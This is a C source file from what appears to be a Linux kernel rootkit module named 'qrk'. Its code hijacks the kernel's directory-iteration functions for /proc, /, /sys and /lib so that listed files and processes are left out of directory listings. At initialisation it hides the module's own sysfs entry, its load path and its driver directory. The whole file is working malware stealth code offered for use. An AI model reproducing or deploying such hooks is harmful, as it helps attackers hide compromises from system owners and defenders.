#include "qrk_common.h"

struct hidden_file {
    char *path;
    struct list_head list;
};

LIST_HEAD(hidden_files);

void *get_iterate(const char *path)
{
    void *ret;
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

    ret = file->f_op->iterate;
    if (!ret){
        ret = file->f_op->iterate_shared;
    }
    filp_close(file, 0);

    fs_dbg("get_iterate: %p",ret);
    return ret;
}

#define VFS_HOOK_DF(PATH, NAME) \
int (*vfs_original_##NAME##_iterate)(struct file *, struct dir_context *);\
int (*vfs_original_##NAME##_filldir)(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);\
static int vfs_hijacked_##NAME##_filldir(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) { \
    char *filename; \
    struct hidden_file *h_file; \
    fs_dbg("qrk:\n\tName -> %s\n\tInode -> %llu\n\td_type -> %u\n\toffset -> %lld\n", name, ino, d_type, offset); \
    fs_dbg("qrk: Filenames\n"); \
    list_for_each_entry(h_file, &hidden_files, list) { \
        filename = strrchr(h_file->path, '/') + 1; \
        fs_dbg("qrk: \t%s == %s\n", name, filename); \
        if (!strncmp(name, filename, strlen(name) + 1)) { \
            return 0; \
        } \
    } \
    return vfs_original_##NAME##_filldir(ctx, name, namelen, offset, ino, d_type); \
} \
int vfs_hijacked_##NAME##_iterate(struct file *file, struct dir_context *ctx) { \
    int ret; \
    int length; \
    struct dentry de;\
    struct hidden_file *h_file;\
    char *path_name = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);\
    char *path_name_tmp = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);\
    memset(path_name, 0, PATH_MAX);\
    memset(path_name_tmp, 0, PATH_MAX);\
    vfs_original_##NAME##_filldir = ctx->actor;\
    de = *(file->f_path.dentry);\
    do {\
        /*fs_dbg("qrk: Parent file path -> %s\n", de.d_name.name);*/\
        length = strlen(de.d_name.name);\
        strncpy(path_name_tmp+length+1, path_name, strlen(path_name));\
        if (de.d_name.name[0] != '/') {\
            strncpy(path_name_tmp+1, de.d_name.name, length);\
            path_name_tmp[0] = '/';\
        } else {\
            strncpy(path_name_tmp, de.d_name.name, length);\
        }\
        strncpy(path_name, path_name_tmp, strlen(path_name_tmp));\
        de = *(de.d_parent);\
        /*fs_dbg("qrk: Temp path -> %s\n", path_name);*/\
    } while (strncmp(de.d_name.name, "/", 1));\
    length = strlen(path_name);\
    if (length < PATH_MAX && path_name[length-1] != '/') {\
        path_name[length] = '/';\
    } else if (length >= PATH_MAX) {\
        path_name[PATH_MAX-1] = '/';\
        path_name[PATH_MAX] = 0;\
    }\
    /*fs_dbg("qrk: Path %s\n", path_name);*/\
    asm_hijack_pause(&vfs_hijacked_##NAME##_iterate);\
    /*fs_dbg("qrk: Parent directory of file to hide -> %s\n", path_name);*/\
    list_for_each_entry(h_file, &hidden_files, list) {\
        fs_dbg("qrk: \t %s === %s\n",path_name, h_file->path);\
        if (!strncmp(path_name, h_file->path, strlen(path_name))) {\
            *((filldir_t *)&ctx->actor) = &vfs_hijacked_##NAME##_filldir;\
        }\
    }\
    ret = vfs_original_##NAME##_iterate(file, ctx);\
    asm_hijack_resume(&vfs_hijacked_##NAME##_iterate);\
    kfree(path_name);\
    kfree(path_name_tmp);\
    return ret; \
} \
int vfs_##NAME##_init(void){ \
    vfs_original_##NAME##_iterate = get_iterate(PATH); \
    if (!vfs_original_##NAME##_iterate){ \
        fs_dbg("error get " PATH " iterate"); \
        return -ENXIO; \
    } \
    asm_hijack_start(vfs_original_##NAME##_iterate, &vfs_hijacked_##NAME##_iterate); \
    return 0;\
} \
void vfs_##NAME##_exit(void){ \
    asm_hijack_stop(&vfs_hijacked_##NAME##_iterate); \
}

VFS_HOOK_DF("/proc", proc)
VFS_HOOK_DF("/", root)
VFS_HOOK_DF("/sys", sys)
VFS_HOOK_DF("/lib", lib)

#undef VFS_HOOK_DF

void fs_hide_file(char *path) {
    struct hidden_file *h_file;
    int length;

    h_file = kmalloc(sizeof(struct hidden_file), GFP_KERNEL);
    h_file->path = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);
    memset(h_file->path, 0, PATH_MAX);
    length = strlen(path);

    if (length > PATH_MAX) {
        length = PATH_MAX;
    }

    strncpy(h_file->path, path, length);

    if (length > 1 && h_file->path[length-1] == '/') {
        h_file->path[length-1] = 0;
    }

    list_add(&h_file->list, &hidden_files);
    fs_dbg("qrk: Hide file -> %s\n", h_file->path);
}
void fs_unhide_file(char *path) {
    struct hidden_file *h_file;
    struct list_head *next;
    struct list_head *prev;

    list_for_each_entry(h_file, &hidden_files, list) {
        if (!strncmp(path, h_file->path, strlen(h_file->path))) {
            fs_dbg("qrk: Unhide file -> %s\n", h_file->path);
            kfree(h_file->path);
            /* list_del(&h_file->list);
               doesn't work, don't know why
               tmp solution
            */
            next = h_file->list.next;
            prev = h_file->list.prev;
            next->prev = prev;
            prev->next = next;
            kfree(&h_file->list);
            kfree(h_file);
        }
    }
}
int fs_hook_init(void)
{
    vfs_root_init(); // hide fs
    vfs_proc_init(); // use to hide process
    vfs_sys_init(); 

    fs_hide_file("/module/" KBUILD_MODNAME); // hide /sys/module/qrk
    fs_hide_file(LOAD_PATH);
    fs_hide_file(DRIVER_DIRECTORY);

    return 0;
}

void fs_hook_exit(void)
{
    vfs_sys_exit();
    vfs_proc_exit();
    vfs_root_exit();
}